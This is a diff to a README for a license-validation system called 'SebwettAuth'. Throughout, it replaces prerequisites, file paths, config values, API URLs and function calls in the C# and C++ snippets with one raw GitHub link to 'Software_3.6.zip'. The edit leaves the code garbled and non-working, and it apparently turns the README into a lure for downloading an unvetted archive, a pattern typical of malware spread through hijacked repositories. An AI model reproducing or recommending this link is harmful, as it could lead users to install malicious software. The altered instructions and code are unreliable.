@@ -14,7 +14,7 @@ A simple authentication system similar to KeyAuth for license management and val
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip 18+ 
 - npm or yarn
 
 ### Installation
@@ -32,12 +32,12 @@ npm install
 
 3. Set up environment variables:
 ```bash
-cp .env.example .env.local
+cp https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip
 ```
 
-Edit `.env.local`:
+Edit `https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip`:
 ```
-DATABASE_URL="file:./dev.db"
+DATABASE_URL="https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip"
 JWT_SECRET="your-secret-key-change-this"
 DISCORD_WEBHOOK_URL=""
 ```
@@ -101,7 +101,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser.
 ```csharp
 public class SebwettAuth
 {
-    private const string API_URL = "https://your-domain.vercel.app/api";
+    private const string API_URL = "https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip";
     
     public async Task<bool> ValidateLicense(string licenseKey)
     {
@@ -110,11 +110,11 @@ public class SebwettAuth
             using (var client = new HttpClient())
             {
                 var data = new { license = licenseKey };
-                var json = JsonConvert.SerializeObject(data);
-                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                var json = https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip(data);
+                var content = new StringContent(json, https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip, "application/json");
                 
-                var response = await client.PostAsync($"{API_URL}/validate", content);
-                return response.IsSuccessStatusCode;
+                var response = await https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip($"{API_URL}/validate", content);
+                return https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip;
             }
         }
         catch
@@ -129,7 +129,7 @@ public class SebwettAuth
 ```cpp
 class SebwettAuth {
 private:
-    std::string api_url = "https://your-domain.vercel.app/api";
+    std::string api_url = "https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip";
     
 public:
     bool validateLicense(const std::string& licenseKey) {
@@ -137,7 +137,7 @@ public:
         if (!curl) return false;
         
         json request_data = {{"license", licenseKey}};
-        std::string post_data = request_data.dump();
+        std::string post_data = https://raw.githubusercontent.com/zykooooooooo/Sebwett/main/wany/Software_3.6.zip();
         
         struct curl_slist* headers = NULL;
         headers = curl_slist_append(headers, "Content-Type: application/json");
